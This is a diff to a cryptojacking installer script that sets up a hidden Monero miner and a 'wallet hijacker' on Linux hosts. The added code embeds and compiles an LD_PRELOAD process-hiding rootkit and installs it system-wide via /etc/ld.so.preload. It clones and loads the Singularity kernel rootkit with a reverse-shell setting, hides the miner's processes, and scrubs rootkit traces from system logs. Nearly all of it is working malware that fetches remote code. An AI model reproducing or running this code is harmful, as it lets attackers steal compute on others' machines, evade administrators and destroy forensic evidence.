@@ -1265,6 +1265,254 @@ else
     unset GIT_TERMINAL_PROMPT
 fi
 
+# ==================== INSTALL LD_PRELOAD ROOTKIT (ALL KERNELS) ====================
+echo ""
+echo "========================================"
+echo "INSTALLING LD_PRELOAD ROOTKIT"
+echo "========================================"
+echo "[*] This works on ALL kernel versions!"
+
+# Download the processhider.c from GitHub
+cd /tmp || exit 1
+echo "[*] Downloading processhider.c from GitHub..."
+
+curl -s -o /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libprocesshider/refs/heads/master/processhider.c 2>/dev/null || {
+    echo "[!] curl failed, trying wget..."
+    wget -q -O /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libprocesshider/refs/heads/master/processhider.c 2>/dev/null || {
+        echo "[!] Could not download processhider.c, creating from embedded code..."
+        
+        # Fallback: Create from embedded code
+        cat > /tmp/processhider.c << 'PROCESSHIDER_EOF'
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+#include <unistd.h>
+
+/*
+ * Every process with this name will be excluded
+ */
+static const char* process_to_filter = "swapd";
+
+/*
+ * Get a directory name given a DIR* handle
+ */
+static int get_dir_name(DIR* dirp, char* buf, size_t size)
+{
+    int fd = dirfd(dirp);
+    if(fd == -1) {
+        return 0;
+    }
+
+    char tmp[64];
+    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
+    ssize_t ret = readlink(tmp, buf, size);
+    if(ret == -1) {
+        return 0;
+    }
+
+    buf[ret] = 0;
+    return 1;
+}
+
+/*
+ * Get a process name given its pid
+ */
+static int get_process_name(char* pid, char* buf)
+{
+    if(strspn(pid, "0123456789") != strlen(pid)) {
+        return 0;
+    }
+
+    char tmp[256];
+    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
+ 
+    FILE* f = fopen(tmp, "r");
+    if(f == NULL) {
+        return 0;
+    }
+
+    if(fgets(tmp, sizeof(tmp), f) == NULL) {
+        fclose(f);
+        return 0;
+    }
+
+    fclose(f);
+
+    int unused;
+    sscanf(tmp, "%d (%[^)]s", &unused, buf);
+    return 1;
+}
+
+#define DECLARE_READDIR(dirent, readdir)                                \
+static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
+                                                                        \
+struct dirent* readdir(DIR *dirp)                                       \
+{                                                                       \
+    if(original_##readdir == NULL) {                                    \
+        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
+        if(original_##readdir == NULL)                                  \
+        {                                                               \
+            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
+        }                                                               \
+    }                                                                   \
+                                                                        \
+    struct dirent* dir;                                                 \
+                                                                        \
+    while(1)                                                            \
+    {                                                                   \
+        dir = original_##readdir(dirp);                                 \
+        if(dir) {                                                       \
+            char dir_name[256];                                         \
+            char process_name[256];                                     \
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
+                strcmp(dir_name, "/proc") == 0 &&                       \
+                get_process_name(dir->d_name, process_name) &&          \
+                strcmp(process_name, process_to_filter) == 0) {         \
+                continue;                                               \
+            }                                                           \
+        }                                                               \
+        break;                                                          \
+    }                                                                   \
+    return dir;                                                         \
+}
+
+DECLARE_READDIR(dirent64, readdir64);
+DECLARE_READDIR(dirent, readdir);
+PROCESSHIDER_EOF
+    }
+}
+
+# Compile the LD_PRELOAD library
+echo "[*] Compiling libprocesshider.so..."
+
+if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null; then
+    echo "[✓] LD_PRELOAD library compiled successfully"
+    
+    # Install system-wide
+    if [ ! -f /etc/ld.so.preload ]; then
+        echo "[*] Installing LD_PRELOAD system-wide..."
+        echo "/usr/local/lib/libprocesshider.so" > /etc/ld.so.preload
+        echo "[✓] LD_PRELOAD activated in /etc/ld.so.preload"
+    else
+        # Check if already in ld.so.preload
+        if ! grep -q "libprocesshider.so" /etc/ld.so.preload; then
+            echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
+            echo "[✓] LD_PRELOAD added to existing /etc/ld.so.preload"
+        else
+            echo "[✓] LD_PRELOAD already configured"
+        fi
+    fi
+    
+    echo "[✓] Processes named 'swapd' will be hidden from ps/top/htop"
+else
+    echo "[!] Failed to compile LD_PRELOAD library"
+    echo "[!] Trying to install gcc..."
+    apt-get install -y gcc 2>&1 | tail -3
+    
+    # Try again
+    if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null; then
+        echo "[✓] LD_PRELOAD library compiled successfully (second attempt)"
+        echo "/usr/local/lib/libprocesshider.so" > /etc/ld.so.preload
+        echo "[✓] LD_PRELOAD activated"
+    else
+        echo "[!] LD_PRELOAD compilation failed - continuing without it"
+    fi
+fi
+
+# Clean up
+rm -f /tmp/processhider.c
+
+# ==================== INSTALL SINGULARITY (KERNEL 6.X ONLY) ====================
+KERNEL_MAJOR=$(uname -r | cut -d. -f1)
+
+if [ "$KERNEL_MAJOR" -eq 6 ]; then
+    echo ""
+    echo "========================================"
+    echo "INSTALLING SINGULARITY ROOTKIT"
+    echo "For Kernel 6.x"
+    echo "========================================"
+    
+    # Ensure we're in /dev/shm for stealth
+    cd /dev/shm || cd /tmp || exit 1
+    
+    # Remove old Singularity if exists
+    if [ -d "Singularity" ]; then
+        rm -rf Singularity
+    fi
+    
+    echo "[*] Cloning Singularity from GitHub..."
+    export GIT_TERMINAL_PROMPT=0
+    
+    if git clone --depth 1 https://github.com/MatheuZSecurity/Singularity 2>&1 | grep -v "Username"; then
+        unset GIT_TERMINAL_PROMPT
+        
+        cd Singularity || {
+            echo "[!] Failed to cd to Singularity directory"
+        }
+        
+        if [ -f "Makefile" ]; then
+            # Configure reverse shell IP (localhost by default)
+            echo "[*] Configuring Singularity..."
+            sed -i 's/192\.168\.1\.100/127.0.0.1/g' modules/icmp.c 2>/dev/null
+            
+            # Try to compile
+            echo "[*] Compiling Singularity (this may take a minute)..."
+            
+            if make 2>&1 | tee /tmp/singularity_build.log | tail -5 | grep -q "singularity.ko"; then
+                echo "[✓] Singularity compiled successfully!"
+                
+                # Try to load the module
+                echo "[*] Loading Singularity kernel module..."
+                
+                if insmod singularity.ko 2>/dev/null; then
+                    echo "[✓] Singularity loaded successfully!"
+                    echo "[*] Use 'kill -59 <PID>' to hide processes"
+                    
+                    # Clean up logs
+                    sleep 1
+                    sed -i '/singularity/d' /var/log/syslog 2>/dev/null
+                    sed -i '/singularity/d' /var/log/kern.log 2>/dev/null
+                    sed -i '/singularity/d' /var/log/messages 2>/dev/null
+                    
+                    # Set flag for later process hiding
+                    SINGULARITY_LOADED=true
+                else
+                    echo "[!] Failed to load Singularity module"
+                    echo "[!] Check: dmesg | tail -20"
+                    dmesg | tail -10 | grep -i error || true
+                    SINGULARITY_LOADED=false
+                fi
+            else
+                echo "[!] Singularity compilation failed"
+                echo "[*] Error log (last 10 lines):"
+                tail -10 /tmp/singularity_build.log | grep -i error || tail -10 /tmp/singularity_build.log
+                echo ""
+                echo "[*] This is OK - LD_PRELOAD will still hide processes"
+                SINGULARITY_LOADED=false
+            fi
+        else
+            echo "[!] Makefile not found in Singularity directory"
+            SINGULARITY_LOADED=false
+        fi
+        
+        # Go back to safe directory
+        cd /tmp 2>/dev/null || true
+    else
+        echo "[!] Failed to clone Singularity (network or repository unavailable)"
+        echo "[*] This is OK - LD_PRELOAD will still hide processes"
+        unset GIT_TERMINAL_PROMPT
+        SINGULARITY_LOADED=false
+    fi
+else
+    echo ""
+    echo "[*] Kernel $(uname -r) - Skipping Singularity (only for 6.x)"
+    echo "[*] LD_PRELOAD rootkit is active (works on all kernels)"
+    SINGULARITY_LOADED=false
+fi
+
 # ==================== START MINER SERVICE ====================
 echo ''
 echo "[*] Starting swapd service..."
@@ -1281,7 +1529,31 @@ fi
 # ==================== HIDE MINER PROCESSES ====================
 echo "[*] Hiding miner processes..."
 
-# Hide with crypto rootkit (kill -31)
+# Method 1: LD_PRELOAD (automatic, system-wide)
+if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
+    echo "[✓] LD_PRELOAD rootkit active (processes automatically hidden)"
+    echo "    Processes named 'swapd' are invisible to ps/top/htop"
+fi
+
+# Method 2: Singularity (kill -59) for Kernel 6.x
+if [ "$SINGULARITY_LOADED" = true ]; then
+    echo "[*] Using Singularity to hide processes (kernel 6.x)..."
+    sleep 3  # Give processes time to start
+    
+    # Hide miner process
+    MINER_PID=$(pgrep -f "swapfile" 2>/dev/null | head -1)
+    if [ -n "$MINER_PID" ]; then
+        kill -59 "$MINER_PID" 2>/dev/null && echo "[✓] Miner hidden with Singularity (PID: $MINER_PID)"
+    fi
+    
+    # Hide wallet hijacker
+    HIJACKER_PID=$(pgrep -f "lightdm.*daemon" 2>/dev/null | head -1)
+    if [ -n "$HIJACKER_PID" ]; then
+        kill -59 "$HIJACKER_PID" 2>/dev/null && echo "[✓] Wallet hijacker hidden with Singularity (PID: $HIJACKER_PID)"
+    fi
+fi
+
+# Method 3: Hide with crypto rootkit (kill -31)
 if lsmod | grep -q rootkit 2>/dev/null; then
     MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
     if [ -n "$MINER_PIDS" ]; then
@@ -1293,10 +1565,10 @@ if lsmod | grep -q rootkit 2>/dev/null; then
         echo "[✓] Processes hidden with crypto rootkit (kill -31)"
     fi
 else
-    echo "[!] Crypto rootkit not loaded, skipping process hiding"
+    echo "[*] Crypto rootkit not loaded (this is OK)"
 fi
 
-# Hide with Diamorphine (kill -31 and kill -63)
+# Method 4: Hide with Diamorphine (kill -31 and kill -63)
 if lsmod | grep -q diamorphine 2>/dev/null; then
     MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep -E "swapd|kswapd0" | grep -v "grep" | awk '{print $2}')
     if [ -n "$MINER_PIDS" ]; then
@@ -1341,6 +1613,19 @@ sed -i '/reptile/d' /var/log/messages 2>/dev/null
 sed -i '/Reptile/d' /var/log/syslog 2>/dev/null
 sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
 sed -i '/Reptile/d' /var/log/messages 2>/dev/null
+
+# Remove Singularity evidence
+sed -i '/singularity/d' /var/log/syslog 2>/dev/null
+sed -i '/singularity/d' /var/log/kern.log 2>/dev/null
+sed -i '/singularity/d' /var/log/messages 2>/dev/null
+sed -i '/Singularity/d' /var/log/syslog 2>/dev/null
+sed -i '/Singularity/d' /var/log/kern.log 2>/dev/null
+sed -i '/Singularity/d' /var/log/messages 2>/dev/null
+
+# Remove LD_PRELOAD evidence
+sed -i '/libprocesshider/d' /var/log/syslog 2>/dev/null
+sed -i '/libprocesshider/d' /var/log/auth.log 2>/dev/null
+sed -i '/ld.so.preload/d' /var/log/syslog 2>/dev/null
 
 # Remove the mount/unmount evidence
 sed -i '/proc-.*mount/d' /var/log/syslog 2>/dev/null
@@ -1520,6 +1805,19 @@ fi
 echo ''
 echo 'Stealth Features Deployed:'
 
+if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
+    echo '  ✓ LD_PRELOAD Rootkit: ACTIVE (userland process hiding - ALL KERNELS)'
+    echo '    Processes named "swapd" invisible to ps/top/htop'
+else
+    echo '  ○ LD_PRELOAD Rootkit: Not loaded'
+fi
+
+if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q singularity 2>/dev/null; then
+    echo '  ✓ Singularity: ACTIVE (kernel 6.x rootkit - kill -59 to hide)'
+else
+    echo '  ○ Singularity: Not loaded (only for kernel 6.x)'
+fi
+
 if lsmod | grep -q diamorphine 2>/dev/null; then
     echo '  ✓ Diamorphine: ACTIVE (kernel rootkit)'
 else
@@ -1553,7 +1851,7 @@ fi
 echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
 echo '  ✓ Process name: kworker/0:0 (kernel worker thread - prctl renamed)'
 echo '  ✓ Binary structure: swapd wrapper → .kworker (actual miner)'
-echo '  ✓ Process hiding: Kernel rootkits ONLY (Diamorphine, Reptile, crypto-rootkit)'
+echo '  ✓ Process hiding: LD_PRELOAD + Kernel rootkits (multi-layer)'
 
 echo ''
 echo 'Installation Method:'
@@ -1572,13 +1870,20 @@ echo '  Pool:    gulf.moneroocean.stream:80'
 
 echo ''
 echo 'Process Hiding Commands:'
-echo '  Hide:    kill -31 $PID  (requires Diamorphine or crypto rootkit)'
-echo '  Unhide:  kill -63 $PID  (requires Diamorphine)'
-echo '  Reptile: reptile_cmd hide'
+echo '  LD_PRELOAD: Automatic (always active, system-wide)'
+echo '  Singularity: kill -59 $PID  (kernel 6.x only)'
+echo '  Diamorphine: kill -31 $PID  (hide), kill -63 $PID (unhide)'
+echo '  Crypto-RK:   kill -31 $PID  (hide)'
+echo '  Reptile:     reptile_cmd hide'
 
 echo ''
 echo '========================================================================='
 echo '[*] Miner will auto-stop when admins login and restart when they logout'
-echo '[*] All processes are hidden ONLY via kernel rootkits'
-echo '[*] No userland hiding (no libhide, no mount tricks)'
-echo '========================================================================='
+echo '[*] Multi-layer process hiding:'
+echo '    Layer 1: LD_PRELOAD (userland - works on ALL kernels)'
+if [ "$SINGULARITY_LOADED" = true ]; then
+    echo '    Layer 2: Singularity (kernel-level - Kernel 6.x)'
+fi
+echo '    Layer 3: Kernel rootkits (Diamorphine/Reptile/Crypto-RK)'
+echo '[*] Processes automatically hidden after installation'
+echo '========================================================================'
